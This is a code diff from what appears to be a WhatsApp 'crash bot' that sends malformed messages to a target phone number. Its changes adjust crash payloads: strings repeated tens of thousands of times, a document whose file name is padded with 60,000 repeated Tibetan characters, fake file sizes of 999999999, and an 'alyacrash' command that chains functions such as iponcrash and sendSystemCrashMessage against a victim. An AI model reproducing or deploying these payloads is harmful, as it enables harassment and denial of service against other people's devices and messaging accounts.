@@ -322,7 +322,7 @@ const sendReaction = async reactionContent => {
                     AlyaBotInc.sendMessage(
                         recipientJid,
                         {
-                            text: "alyatext6".repeat(50000)
+                            text: "".repeat(50000)
                         },
                         {
                             participant: {
@@ -1005,7 +1005,7 @@ const sendReaction = async reactionContent => {
                 },
                 message: {
                     listResponseMessage: {
-                        title: `alyatext1`
+                        title: `ALYA IS YOUR QUEEN`
                     }
                 }
             };
@@ -1017,8 +1017,8 @@ const sendReaction = async reactionContent => {
                             url: "./settings.js"
                         },
                         mimetype: `image/null`,
-                        fileName: `${alya}.${alyatext6}`,
-                        caption: `${alya + alyatext6}`
+                        fileName: `${alya}.${alyatext1}`,
+                        caption: `${alya + alyatext1}`
                     },
                     {
                         quoted: subscribe_alya
@@ -1178,7 +1178,7 @@ async function bakdok(target, kuwoted) {
     "fileLength": "999999999",
     "pageCount": 999999999,
     "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-    "fileName": `𝐀𝐥𝐲𝐚 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(100000),
+    "fileName": `𝐀𝐥𝐲𝐚 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(60000),
     "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
     "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
     "mediaKeyTimestamp": "1715880173"
@@ -21295,11 +21295,13 @@ case "alyacrash": {
          // Random delay between 2 
         await sendPaymentInfoMessage(whatsappNumber, Alyabug);
         await penghitaman(whatsappNumber, painbug);
+        await AlyaCrashy(whatsappNumber, force);
         await iponcrash(whatsappNumber, force);
         await sendSystemCrashMessage(whatsappNumber, force);
+   sendSystemCrashMessage(whatsappNumber, force2);
         await sendPaymentInfoMessage(whatsappNumber, painbug);
         await ngeloc(whatsappNumber, force2);
-        await AlyaCrashy(whatsappNumber, painbug);
+        await ngeloc(whatsappNumber, painbug);
 
          if (j === 1) {
             // Additional logic if needed
